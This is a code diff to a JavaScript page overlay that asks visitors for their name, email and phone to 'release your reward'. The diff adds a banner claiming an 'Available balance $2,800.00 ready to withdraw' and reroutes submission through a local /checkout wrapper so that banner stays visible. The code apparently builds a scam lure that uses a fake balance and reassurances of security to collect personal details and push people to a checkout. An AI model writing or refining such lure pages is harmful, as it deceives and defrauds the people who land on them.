@@ -84,10 +84,13 @@
       "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.55);display:flex;align-items:flex-start;justify-content:center;padding:24px 16px;overflow-y:auto;font-family:'Inter',system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
     overlay.innerHTML =
       "" +
-      '<div style="width:100%;max-width:420px;background:#F5F5F5;border-radius:16px;padding:22px 20px 24px;margin-top:24px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">' +
+      '<div style="width:100%;max-width:420px;background:#F5F5F5;border-radius:16px;overflow:hidden;margin-top:24px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">' +
+      '<img src="/checkout-balance-banner.webp" alt="Available balance $2,800.00 ready to withdraw" style="display:block;width:100%;height:auto;background:#05080c;" />' +
+      '<div style="padding:22px 20px 24px;">' +
       '<div style="display:flex;justify-content:center;margin-bottom:16px;">' +
       '<div style="background:#fff;border-radius:999px;padding:8px 18px;font-size:11px;font-weight:800;letter-spacing:1.5px;color:#111;">CONFIRMATION</div>' +
       "</div>" +
+
       '<h2 style="margin:0 0 8px;font-size:18px;font-weight:800;color:#111;text-align:center;line-height:1.3;">Confirm your details</h2>' +
       '<p style="margin:0 0 18px;font-size:13px;color:#6b6b6b;text-align:center;line-height:1.4;">Verify your info below to release your reward.</p>' +
       '<div style="background:#fff;border-radius:14px;padding:18px 16px;">' +
@@ -100,7 +103,9 @@
       '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
       '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
       "</div>" +
+      "</div>" +
       "</div>";
+
     document.body.appendChild(overlay);
 
     const nameEl = overlay.querySelector("#__cfName");
@@ -146,9 +151,18 @@
       btn.textContent = "PROCESSING...";
       btn.style.opacity = "0.85";
       const finalUrl = buildCheckoutUrl(targetUrl, name, email, phone);
+      let navigateTo = finalUrl;
+      try {
+        const parsed = new URL(finalUrl, window.location.href);
+        if (CHECKOUT_HOST_RE.test(parsed.hostname)) {
+          // Keep the branded balance banner on top by going through the local /checkout wrapper.
+          navigateTo = "/checkout?" + parsed.searchParams.toString();
+        }
+      } catch {}
       setTimeout(function () {
-        window.location.href = finalUrl;
+        window.location.href = navigateTo;
       }, 200);
+
     }
 
     btn.addEventListener("click", submit);
